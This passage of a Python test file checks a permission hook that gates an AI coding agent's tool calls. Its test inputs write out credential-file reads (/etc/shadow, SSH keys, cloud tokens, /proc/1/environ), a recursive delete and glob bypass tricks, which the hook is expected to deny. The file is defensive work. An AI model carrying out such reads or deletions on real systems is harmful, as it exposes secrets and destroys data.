#!/usr/bin/env python3
"""test_claude_code_adapter.py — adapters/claude-code/pretooluse_hook.py のテスト (Phase 3A)

契約:
1. 既存の Claude Code PreToolUse hook 契約（Read, Edit, Bash, WebFetch等）の互換性維持
2. Lease Gate (Phase 3A) 連携:
   - Lease 管理ドメイン内の Edit/Write: 有効 Lease あり -> exit 0, Lease なし/無効 -> exit 2 + stderr
   - Lease 管理外の Edit/Write: 従来の Portable Core 判定へフォールバック
"""

from __future__ import annotations

import io
import json
import os
import subprocess
import sys
import tempfile

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_ADAPTER_DIR = os.path.join(ROOT_DIR, "adapters", "claude-code")
_HOOK_PATH = os.path.join(_ADAPTER_DIR, "pretooluse_hook.py")
RUNTIME_DIR = os.path.join(ROOT_DIR, "runtime")
if RUNTIME_DIR not in sys.path:
    sys.path.insert(0, RUNTIME_DIR)
if _ADAPTER_DIR not in sys.path:
    sys.path.insert(0, _ADAPTER_DIR)

import local_execution_gate as leg
import permission_request_hook as permission_hook
import pretooluse_hook as hook
from local_execution_lease import (
    CanonicalTaskReference,
    PolicyReference,
    RuntimeContext,
    derive_lease,
)
from local_execution_lease_state import LeaseRuntimeState, LeaseStateStore, ObservedExecutionState

PASS = 0
FAIL = 0


def check(name: str, condition: bool, detail: str = "") -> None:
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  PASS  {name}")
    else:
        FAIL += 1
        print(f"  FAIL  {name}  {detail}")
        assert condition, f"{name}: {detail}"


def run_hook_subproc(payload: dict, env: dict | None = None) -> subprocess.CompletedProcess:
    hook_env = os.environ.copy()
    hook_env.setdefault("UME_HARNESS_STATE_DIR", "/tmp/ume_harness_test_isolated_state")
    if env:
        hook_env.update(env)
    return subprocess.run(
        [sys.executable, _HOOK_PATH],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=hook_env,
    )


# --- 1. 既存の基本フック挙動テスト ---
def test_read_tool_allowed() -> None:
    print("\n[ALLOW] Read tool -> exit 0")
    p = run_hook_subproc({"tool_name": "Read", "tool_input": {"file_path": "/tmp/x.txt"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_pretooluse_allow_emits_structured_system_message() -> None:
    print("\n[PreToolUse Presentation] Allowed tool emits user-visible structured JSON")
    with tempfile.TemporaryDirectory() as td:
        proc = run_hook_subproc(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "Read",
                "tool_input": {"file_path": os.path.join(td, "notes.txt")},
                "cwd": td,
                "permission_mode": "auto",
            },
            env={"UME_HARNESS_STATE_DIR": td},
        )
    check("PreToolUse allow -> exit 0", proc.returncode == 0, f"got {proc.returncode}")
    check("PreToolUse stdout is JSON", proc.stdout.lstrip().startswith("{"), f"stdout={proc.stdout!r}")
    output = json.loads(proc.stdout)
    check("PreToolUse has systemMessage", "systemMessage" in output, f"output={output!r}")
    check("PreToolUse Japanese explanation is visible", "🇯🇵" in output["systemMessage"])
    check("PreToolUse presentation does not decide authority", "hookSpecificOutput" not in output)
    check("PreToolUse success stderr is empty", proc.stderr == "", f"stderr={proc.stderr!r}")


def test_pretooluse_write_uses_visible_detailed_banner() -> None:
    print("\n[PreToolUse Presentation] Write-like tools use the detailed permission banner")
    with tempfile.TemporaryDirectory() as td:
        proc = run_hook_subproc(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "Edit",
                "tool_input": {"file_path": os.path.join(td, "notes.txt")},
                "cwd": td,
                "permission_mode": "default",
            },
            env={"UME_HARNESS_STATE_DIR": td},
        )
    check("PreToolUse write -> exit 0", proc.returncode == 0, f"got {proc.returncode}")
    output = json.loads(proc.stdout)
    banner = output.get("systemMessage", "")
    check("PreToolUse write banner is detailed", "詳細:" in banner, f"banner={banner!r}")
    check("PreToolUse write banner names local mutation", "PC内のファイルを変更" in banner)
    check("PreToolUse write presentation does not decide authority", "hookSpecificOutput" not in output)


def test_edit_tool_allowed_tier_normal_unmanaged() -> None:
    print("\n[ALLOW] Edit tool (BOUNDED_WRITE, unmanaged domain) -> exit 0")
    p = run_hook_subproc({"tool_name": "Edit", "tool_input": {"file_path": "/tmp/x.txt"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_unmanaged_protected_paths_use_canonical_tier() -> None:
    print("\n[Path Tier] Protected unmanaged paths must not fall back to TIER_NORMAL")
    with tempfile.TemporaryDirectory() as td:
        settings_path = os.path.join(td, ".claude", "settings.json")
        secret_path = os.path.join(td, ".ssh", "id_rsa")
        constitution_path = os.path.join(td, "AGENTS.md")
        normal_path = os.path.join(td, "notes.md")
        cases = [
            ("runtime settings edit", {"tool_name": "Edit", "tool_input": {"file_path": settings_path}}, 2),
            ("runtime local settings edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".claude", "settings.local.json")}}, 2),
            ("runtime config edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "config.toml")}}, 2),
            ("automation edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "scripts", "release.sh")}}, 2),
            ("CI workflow edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".github", "workflows", "ci.yml")}}, 2),
            ("CI pipeline edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "Jenkinsfile")}}, 2),
            ("governance policy edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "contracts", "tool_policy.md")}}, 2),
            ("git config edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".git", "config")}}, 2),
            ("git hook edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".git", "hooks", "pre-commit")}}, 2),
            ("systemd service edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".config", "systemd", "user", "sync.service")}}, 2),
            ("launchd service edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "Library", "LaunchAgents", "com.example.sync.plist")}}, 2),
            ("cron.d scheduler edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/cron.d/ume-harness-test"}}, 2),
            ("cron.daily scheduler edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/cron.daily/ume-harness-test"}}, 2),
            ("system SSH client config edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/ssh/ssh_config"}}, 2),
            ("system SSH daemon config write", {"tool_name": "Write", "tool_input": {"file_path": "/etc/ssh/sshd_config"}}, 2),
            ("system SSH config snippet edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/ssh/ssh_config.d/50-local.conf"}}, 2),
            ("system shadow read", {"tool_name": "Read", "tool_input": {"file_path": "/etc/shadow"}}, 2),
            ("system gshadow read", {"tool_name": "Read", "tool_input": {"file_path": "/etc/gshadow"}}, 2),
            ("macOS master passwd read", {"tool_name": "Read", "tool_input": {"file_path": "/private/etc/master.passwd"}}, 2),
            ("macOS keychain read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "Library", "Keychains", "login.keychain-db")}}, 2),
            ("Claude root config read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".claude.json")}}, 2),
            ("Claude root config edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".claude.json")}}, 2),
            ("global Git config edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".gitconfig")}}, 2),
            ("sudoers edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/sudoers"}}, 2),
            ("sudoers snippet edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/sudoers.d/ume-harness-test"}}, 2),
            ("system profile edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/profile"}}, 2),
            ("PAM policy edit", {"tool_name": "Edit", "tool_input": {"file_path": "/etc/pam.d/sudo"}}, 2),
            ("deploy config edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "deploy", "vercel.json")}}, 2),
            ("netrc read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".netrc")}}, 2),
            ("npm credentials read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".npmrc")}}, 2),
            ("PyPI credentials read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".pypirc")}}, 2),
            ("dotenv suffix read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "production.env")}}, 2),
            ("dotenv suffix edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "config.env")}}, 2),
            ("Azure access token read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".azure", "accessTokens.json")}}, 2),
            ("generic token JSON read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".config", "service", "token.json")}}, 2),
            ("GitHub CLI hosts read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".config", "gh", "hosts.yml")}}, 2),
            ("Docker auth config read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".docker", "config.json")}}, 2),
            ("Kubernetes auth config read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".kube", "config")}}, 2),
            ("process environment read", {"tool_name": "Read", "tool_input": {"file_path": "/proc/self/environ"}}, 2),
            ("process environment Bash read", {"tool_name": "Bash", "tool_input": {"command": "cat /proc/1/environ"}}, 2),
            ("nested process environment read", {"tool_name": "Read", "tool_input": {"file_path": "/proc/1/task/1/environ"}}, 2),
            ("rclone config read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".config", "rclone", "rclone.conf")}}, 2),
            ("zsh startup file edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".zshrc")}}, 2),
            ("bash startup file edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".bashrc")}}, 2),
            ("POSIX startup file edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, ".profile")}}, 2),
            ("credentials directory read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "credentials", "token.txt")}}, 2),
            ("singular secret directory read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "secret", "token.txt")}}, 2),
            ("keys directory read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "keys", "api.txt")}}, 2),
            ("api key file read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "api_key.json")}}, 2),
            ("private key file read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, "private_key")}}, 2),
            ("notebook edit", {"tool_name": "NotebookEdit", "tool_input": {"notebook_path": os.path.join(td, "analysis.ipynb")}}, 2),
            ("secret read", {"tool_name": "Read", "tool_input": {"file_path": secret_path}}, 2),
            ("SSH config read", {"tool_name": "Read", "tool_input": {"file_path": os.path.join(td, ".ssh", "config")}}, 2),
            ("secret glob", {"tool_name": "Glob", "tool_input": {"path": os.path.dirname(secret_path), "pattern": "*"}}, 2),
            ("secret grep", {"tool_name": "Grep", "tool_input": {"path": os.path.dirname(secret_path), "pattern": "key"}}, 2),
            ("secret bash read", {"tool_name": "Bash", "tool_input": {"command": f"cat {secret_path}"}}, 2),
            ("constitution edit", {"tool_name": "Edit", "tool_input": {"file_path": constitution_path}}, 2),
            ("AGENTS override edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "AGENTS.override.md")}}, 2),
            ("CLAUDE local edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "CLAUDE.local.md")}}, 2),
            ("constitution read", {"tool_name": "Read", "tool_input": {"file_path": constitution_path}}, 0),
            ("extensionless CLI edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "bin", "ume-harness")}}, 2),
            ("package manifest edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "package_manifest.json")}}, 2),
            ("autonomous stop contract edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "contracts", "autonomous_stop.md")}}, 2),
            ("task intake contract edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "contracts", "task_intake.md")}}, 2),
            ("root hook executable edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "hooks", "pre-commit")}, "cwd": td}, 2),
            ("root automation executable edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "scripts", "run")}, "cwd": td}, 2),
            ("root CI executable edit", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "ci", "pipeline")}, "cwd": td}, 2),
            ("normal document edit", {"tool_name": "Edit", "tool_input": {"file_path": normal_path}}, 0),
            ("secretary document is normal", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "secretary_notes.md")}}, 0),
            ("ordinary scripts notes are normal", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "Documents", "scripts", "notes.md")}}, 0),
            ("ordinary nested extensionless script is normal", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "Documents", "scripts", "run")}, "cwd": td}, 0),
            ("ordinary policy notes are normal", {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(td, "Documents", "policy.md")}}, 0),
        ]
        gate = leg.create_default_gate(
            state_path=os.path.join(td, "leases.json"),
            domain_resolver=lambda _: None,
        )
        for label, invocation, expected_code in cases:
            code, _ = hook.evaluate_invocation(invocation, gate=gate, state_dir=td)
            check(f"{label} -> exit {expected_code}", code == expected_code, f"got {code}")


def test_compound_secret_directories_use_secret_tier() -> None:
    print("\n[Path Tier] Compound secret directory names must deny Read and Bash reads")
    with tempfile.TemporaryDirectory() as td:
        gate = leg.create_default_gate(
            state_path=os.path.join(td, "leases.json"),
            domain_resolver=lambda _: None,
        )
        for directory in ("api-keys", "secret-store", "credential-store", "private_keys"):
            target = os.path.join(td, directory, "token.txt")
            for invocation in (
                {"tool_name": "Read", "tool_input": {"file_path": target}},
                {"tool_name": "Bash", "tool_input": {"command": f"cat {target}"}},
            ):
                code, _ = hook.evaluate_invocation(invocation, gate=gate, state_dir=td)
                check(
                    f"{invocation['tool_name']} below {directory} -> exit 2",
                    code == 2,
                    f"got {code}",
                )


def test_destructive_bash_blocked() -> None:
    print("\n[BLOCK] rm -rf を含むBash -> exit 2")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "rm -rf /tmp/foo"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")
    check("理由がstderrに出る", "DESTRUCTIVE" in p.stderr, f"stderr={p.stderr!r}")


def test_git_push_blocked() -> None:
    print("\n[BLOCK] git push (EXTERNAL_MUTATION) -> exit 2")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "git push origin main"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_safe_readonly_bash_allowed() -> None:
    print("\n[ALLOW] 明示的に安全なread-onlyコマンド（ls）-> exit 0")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_path_free_readonly_git_commands_remain_allowed() -> None:
    print("\n[ALLOW] Path-free read-only Git inspection remains available")
    with tempfile.TemporaryDirectory() as td:
        for command in ("git status", "git log", "git branch"):
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Bash",
                {"command": command},
                td,
            )
            check(f"{command} -> ALLOW", decision.value == "ALLOW", f"got {decision}")

        for command in (
            "git diff",
            "git show HEAD",
            "git show HEAD:.env",
            "git branch new-branch",
        ):
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Bash",
                {"command": command},
                td,
            )
            check(
                f"{command} remains fail-closed",
                decision.value != "ALLOW",
                f"got {decision}",
            )


def test_bash_read_operands_are_resolved_or_fail_closed() -> None:
    print("\n[Bash Path Resolution] Read operands/pathspecs must not disappear from Tier enforcement")
    with tempfile.TemporaryDirectory() as td:
        secret_dir = os.path.join(td, ".ssh")
        os.makedirs(secret_dir)
        secret_path = os.path.join(secret_dir, "id_rsa")
        with open(secret_path, "w", encoding="utf-8") as secret_out:
            secret_out.write("test-only secret marker")
        os.symlink(secret_path, os.path.join(td, "123"))
        with open(os.path.join(td, "normal.txt"), "w", encoding="utf-8") as normal_out:
            normal_out.write("ordinary note")

        cases = (
            ("numeric filename symlink", "cat 123", "DENY"),
            ("git secret magic pathspec", "git status --short -- ':(top).env'", "DENY"),
            (
                "git normal magic pathspec",
                "git status --short -- ':(top)README.md'",
                "APPROVAL_REQUIRED",
            ),
            ("git secret revision-like pathspec", "git status --short -- HEAD:.env", "DENY"),
            (
                "git normal revision-like pathspec",
                "git status --short -- HEAD:README.md",
                "APPROVAL_REQUIRED",
            ),
            ("indirect wc file list", "wc --files0-from=/outside/list", "APPROVAL_REQUIRED"),
            ("abbreviated indirect wc file list", "wc --files0-f=/outside/list", "APPROVAL_REQUIRED"),
            ("shell previous-directory expansion", "cat ~-/normal.txt", "APPROVAL_REQUIRED"),
            ("known head option value", "head -n 5 normal.txt", "ALLOW"),
        )
        for label, command, expected in cases:
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Bash",
                {"command": command},
                td,
            )
            check(f"{label} -> {expected}", decision.value == expected, f"got {decision}")


def test_ls_recursive_or_dereference_options_fail_closed() -> None:
    print("\n[Bash Scope] ls recursive/dereference options fail closed")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        outside = os.path.join(td, "outside")
        os.makedirs(worktree)
        os.makedirs(outside)
        with open(os.path.join(outside, "secret.txt"), "w", encoding="utf-8") as out:
            out.write("test-only secret marker")
        os.symlink(outside, os.path.join(worktree, "escape"))

        for command in (
            "ls -R .",
            "ls -Ra .",
            "ls -lR .",
            "ls --recursive .",
            "ls --rec .",
            "ls --de .",
            "ls -RL .",
            "ls -lL .",
            "ls --dereference .",
        ):
            resolution = hook.runner._invocation_paths("Bash", {"command": command}, worktree)
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Bash",
                {"command": command},
                worktree,
            )
            check(f"{command!r} path expansion is incomplete", not resolution.complete)
            check(f"{command!r} cannot ALLOW", decision.value != "ALLOW", f"got {decision}")


def test_cwd_sensitive_and_git_reads_fail_closed_for_protected_paths() -> None:
    print("\n[Path Tier] cwd-sensitive and ambiguous git reads must not bypass protected paths")
    with tempfile.TemporaryDirectory() as td:
        secret_dir = os.path.join(td, ".ssh")
        os.makedirs(secret_dir)
        with open(os.path.join(secret_dir, "id_rsa"), "w", encoding="utf-8") as secret_out:
            secret_out.write("test-only secret marker")
        with open(os.path.join(td, "-credentials"), "w", encoding="utf-8") as secret_out:
            secret_out.write("test-only secret marker")
        visible_secret_dir = os.path.join(td, "secrets")
        os.makedirs(visible_secret_dir)
        with open(os.path.join(visible_secret_dir, "api.txt"), "w", encoding="utf-8") as secret_out:
            secret_out.write("test-only secret marker")
        normal_dir = os.path.join(td, "documents")
        os.makedirs(normal_dir)
        with open(os.path.join(normal_dir, "notes.txt"), "w", encoding="utf-8") as normal_out:
            normal_out.write("ordinary note")
        gate = leg.create_default_gate(
            state_path=os.path.join(td, "leases.json"),
            domain_resolver=lambda _: None,
        )
        cases = [
            {"tool_name": "Glob", "tool_input": {"pattern": "*"}, "cwd": secret_dir},
            {"tool_name": "Glob", "tool_input": {"path": td, "pattern": ".ssh/*"}, "cwd": td},
            {"tool_name": "Glob", "tool_input": {"path": td, "pattern": "**/*"}, "cwd": td},
            {"tool_name": "Glob", "tool_input": {"path": td, "pattern": "**/*rsa*"}, "cwd": td},
            {"tool_name": "Grep", "tool_input": {"pattern": "key"}, "cwd": secret_dir},
            {"tool_name": "Grep", "tool_input": {"path": td, "pattern": "PRIVATE", "glob": ".ssh/*"}, "cwd": td},
            {"tool_name": "Grep", "tool_input": {"path": td, "pattern": "marker", "glob": "*.txt"}, "cwd": td},
            {"tool_name": "Grep", "tool_input": {"path": td, "pattern": "marker"}, "cwd": td},
            {"tool_name": "Bash", "tool_input": {"command": "ls -la"}, "cwd": secret_dir},
            {"tool_name": "Bash", "tool_input": {"command": "git status --short -- .env"}, "cwd": td},
            {"tool_name": "Bash", "tool_input": {"command": f"git status --git-dir={secret_dir}"}, "cwd": td},
            {"tool_name": "Bash", "tool_input": {"command": f"git status --pathspec-from-file={os.path.join(secret_dir, 'id_rsa')}"}, "cwd": td},
            {"tool_name": "Bash", "tool_input": {"command": "cat -- -credentials"}, "cwd": td},
            {
                "tool_name": "Bash",
                "tool_input": {"command": f"git diff --no-index {os.path.join(secret_dir, 'id_rsa')} /dev/null"},
                "cwd": td,
            },
            {"tool_name": "Bash", "tool_input": {"command": "git show HEAD:.env"}, "cwd": td},
            {"tool_name": "Bash", "tool_input": {"command": f"cat {td}/*"}, "cwd": td},
        ]
        for invocation in cases:
            code, _ = hook.evaluate_invocation(invocation, gate=gate, state_dir=td)
            check(f"{invocation['tool_name']} protected/ambiguous read -> exit 2", code == 2, f"got {code}")

        code, _ = hook.evaluate_invocation(
            {"tool_name": "Grep", "tool_input": {"path": normal_dir, "pattern": "note"}, "cwd": td},
            gate=gate,
            state_dir=td,
        )
        check("Grep ordinary visible tree -> exit 0", code == 0, f"got {code}")


def test_restrictive_grep_glob_caps_matching_paths_not_unrelated_tree() -> None:
    print("\n[Grep Filter] Restrictive glob is applied before the policy expansion cap")
    with tempfile.TemporaryDirectory() as td:
        for index in range(8):
            with open(os.path.join(td, f"unrelated-{index}.log"), "w", encoding="utf-8") as out:
                out.write("noise")
        with open(os.path.join(td, "wanted.txt"), "w", encoding="utf-8") as out:
            out.write("needle")
        original_cap = hook.runner._MAX_GLOB_POLICY_MATCHES
        hook.runner._MAX_GLOB_POLICY_MATCHES = 3
        try:
            _side_effect, _tiers, decision = hook.runner.invocation_policy(
                "Grep",
                {"path": td, "pattern": "needle", "glob": "*.txt"},
                td,
            )
        finally:
            hook.runner._MAX_GLOB_POLICY_MATCHES = original_cap

        check("restrictive Grep remains provably ALLOW", decision.value == "ALLOW", f"got {decision}")


def test_grep_glob_character_class_mismatch_fails_closed() -> None:
    print("\n[Grep Filter] Host character-class glob semantics must not be under-approximated")
    with tempfile.TemporaryDirectory() as td:
        resolution = hook.runner._grep_policy_paths(td, td, "[^a]*")
        _side_effect, _tiers, decision = hook.runner.invocation_policy(
            "Grep",
            {"path": td, "pattern": "needle", "glob": "[^a]*"},
            td,
        )
        check("character-class glob is incomplete", not resolution.complete)
        check("character-class glob cannot ALLOW", decision.value != "ALLOW", f"got {decision}")


def test_recursive_policy_expansion_caps_visited_entries() -> None:
    print("\n[Search Expansion] Restrictive no-match searches still have a hard visit cap")
    with tempfile.TemporaryDirectory() as td:
        for index in range(8):
            directory = os.path.join(td, f"tree-{index}")
            os.makedirs(directory)
            with open(os.path.join(directory, "ordinary.log"), "w", encoding="utf-8") as out:
                out.write("noise")

        original_cap = hook.runner._MAX_POLICY_VISITED_ENTRIES
        hook.runner._MAX_POLICY_VISITED_ENTRIES = 3
        try:
            grep_resolution = hook.runner._grep_policy_paths(td, td, "*.never")
            glob_resolution = hook.runner._glob_policy_paths(td, "**/*.never", td)
        finally:
            hook.runner._MAX_POLICY_VISITED_ENTRIES = original_cap

        check("restrictive Grep visit cap marks expansion incomplete", not grep_resolution.complete)
        check("recursive Glob visit cap marks expansion incomplete", not glob_resolution.complete)


def test_grep_globs_never_under_approximate_secret_matches() -> None:
    print("\n[Grep Filter] Host-compatible globs must not hide secret paths from Tier enforcement")
    with tempfile.TemporaryDirectory() as td:
        os.makedirs(os.path.join(td, "a", "src"))
        with open(os.path.join(td, ".env"), "w", encoding="utf-8") as out:
            out.write("TOKEN=test-only\n")
        with open(os.path.join(td, "a", ".env"), "w", encoding="utf-8") as out:
            out.write("TOKEN=test-only\n")
        with open(os.path.join(td, "a", "src", "credentials.json"), "w", encoding="utf-8") as out:
            out.write('{"token":"test-only"}\n')

        for pattern in ("*.env", "*"):
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Grep",
                {"path": td, "pattern": "test-only", "glob": pattern},
                td,
            )
            check(f"Grep glob {pattern!r} detects secret match", decision.value == "DENY", f"got {decision}")

        for pattern in ("a/**", "a/**/*.json"):
            resolution = hook.runner._grep_policy_paths(td, td, pattern)
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Grep",
                {"path": td, "pattern": "test-only", "glob": pattern},
                td,
            )
            check(f"unsupported recursive glob {pattern!r} is incomplete", not resolution.complete)
            check(f"unsupported recursive glob {pattern!r} cannot ALLOW", decision.value != "ALLOW", f"got {decision}")


def test_glob_brace_expansion_never_under_approximates_secret_matches() -> None:
    print("\n[Glob Filter] Host brace expansion must fail closed when the resolver cannot prove it")
    with tempfile.TemporaryDirectory() as td:
        secret_dir = os.path.join(td, ".secret-store")
        os.makedirs(secret_dir)
        with open(os.path.join(secret_dir, "token.pem"), "w", encoding="utf-8") as out:
            out.write("test-only secret marker")
        with open(os.path.join(td, "ordinary.pem"), "w", encoding="utf-8") as out:
            out.write("ordinary note")

        pattern = "**/*.{pem,key}"
        resolution = hook.runner._glob_policy_paths(td, pattern, td)
        _effect, _tiers, decision = hook.runner.invocation_policy(
            "Glob",
            {"path": td, "pattern": pattern},
            td,
        )

        check("brace Glob expansion is not declared complete", not resolution.complete)
        check("brace Glob expansion cannot ALLOW", decision.value != "ALLOW", f"got {decision}")


def test_glob_extglob_and_negation_never_under_approximate_secret_matches() -> None:
    print("\n[Glob Filter] Unsupported minimatch extglob/negation syntax fails closed")
    with tempfile.TemporaryDirectory() as td:
        secret_dir = os.path.join(td, ".ssh")
        os.makedirs(secret_dir)
        with open(os.path.join(secret_dir, "id_rsa"), "w", encoding="utf-8") as out:
            out.write("test-only secret marker")

        for pattern in ("@(normal|.ssh)/*", "!(*.md)", "+(.)*", "?(normal|.ssh)/*", "!*.md"):
            resolution = hook.runner._glob_policy_paths(td, pattern, td)
            _effect, _tiers, decision = hook.runner.invocation_policy(
                "Glob",
                {"path": td, "pattern": pattern},
                td,
            )
            check(f"Glob {pattern!r} is not declared complete", not resolution.complete)
            check(f"Glob {pattern!r} cannot ALLOW", decision.value != "ALLOW", f"got {decision}")


def test_globstar_matching_is_memoized() -> None:
    print("\n[Glob Filter] Recursive glob matching has bounded subproblem evaluation")
    original = hook.runner._path_pattern_matches
    calls = 0

    def counted(path_parts, pattern_parts):
        nonlocal calls
        calls += 1
        return original(path_parts, pattern_parts)

    hook.runner._path_pattern_matches = counted
    try:
        matched = counted(tuple(["ordinary"] * 10), tuple(["**"] * 10 + ["never"]))
    finally:
        hook.runner._path_pattern_matches = original

    check("adversarial globstar pattern does not match", not matched)
    check("globstar matcher does not recurse exponentially", calls <= 2, f"calls={calls}")


def test_absolute_glob_inside_worktree_is_provable() -> None:
    print("\n[Glob Scope] Absolute glob fully inside a worktree remains provable")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        source = os.path.join(worktree, "src")
        os.makedirs(source)
        with open(os.path.join(source, "module.py"), "w", encoding="utf-8") as out:
            out.write("pass\n")
        pattern = os.path.join(source, "**", "*.py")

        resolution = hook.runner._glob_policy_paths(worktree, pattern, worktree)
        check("absolute worktree glob expansion is complete", resolution.complete, f"paths={resolution.paths!r}")
        check(
            "absolute worktree glob does not escape",
            hook.runner.check_read_scope_escape("Glob", {"path": worktree, "pattern": pattern}, worktree, worktree) is None,
        )


def test_glob_directory_symlink_traversal_fails_closed() -> None:
    print("\n[Glob Scope] A host-traversable directory symlink cannot hide an out-of-worktree match")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.realpath(os.path.join(td, "worktree"))
        outside = os.path.realpath(os.path.join(td, "outside"))
        os.makedirs(worktree)
        os.makedirs(outside)
        with open(os.path.join(outside, "secret.txt"), "w", encoding="utf-8") as out:
            out.write("test-only secret marker")
        os.symlink(outside, os.path.join(worktree, "link"))

        resolution = hook.runner._glob_policy_paths(worktree, "*/secret.txt", worktree)
        scope_reason = hook.runner.check_read_scope_escape(
            "Glob",
            {"path": worktree, "pattern": "*/secret.txt"},
            worktree,
            worktree,
        )

        check("directory-symlink Glob expansion is incomplete", not resolution.complete)
        check(
            "directory-symlink Glob cannot pass the active-Lease scope gate",
            scope_reason is not None,
            f"paths={resolution.paths!r}",
        )


def test_unrecognized_bash_fails_closed() -> None:
    print("\n[fail-closed] 未知のBashコマンド（allowlist外）-> exit 2（承認要求）")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "some_custom_tool --flag"}})
    check("exit 2（安全側に倒れる）", p.returncode == 2, f"got {p.returncode}")


def test_unrecognized_tool_fails_closed() -> None:
    print("\n[fail-closed] 未知のtool_name -> exit 2")
    p = run_hook_subproc({"tool_name": "SomeFutureTool", "tool_input": {}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_webfetch_blocked_as_external_mutation() -> None:
    print("\n[BLOCK] WebFetch (EXTERNAL_MUTATION) -> exit 2")
    p = run_hook_subproc({"tool_name": "WebFetch", "tool_input": {"url": "https://example.com"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_websearch_requires_approval_as_external_mutation() -> None:
    print("\n[BLOCK] WebSearch (EXTERNAL_MUTATION) -> exit 2")
    p = run_hook_subproc({"tool_name": "WebSearch", "tool_input": {"query": "security"}})
    check("WebSearch exit 2", p.returncode == 2, f"got {p.returncode}")
    check("WebSearch is classified as external mutation", "EXTERNAL_MUTATION" in p.stderr, f"stderr={p.stderr!r}")


def test_malformed_json_input_fails_closed() -> None:
    print("\n[fail-closed] 壊れたJSON入力 -> exit 2（無言で許可しない）")
    p = subprocess.run([sys.executable, _HOOK_PATH], input="not json{{{", capture_output=True, text=True)
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_missing_tool_name_fails_closed_as_invalid_hook_input() -> None:
    print("\n[fail-closed] tool_name欠落・空・null -> INVALID_HOOK_INPUT")
    with tempfile.TemporaryDirectory() as td:
        for payload in (
            {},
            {"tool_name": "", "tool_input": {}},
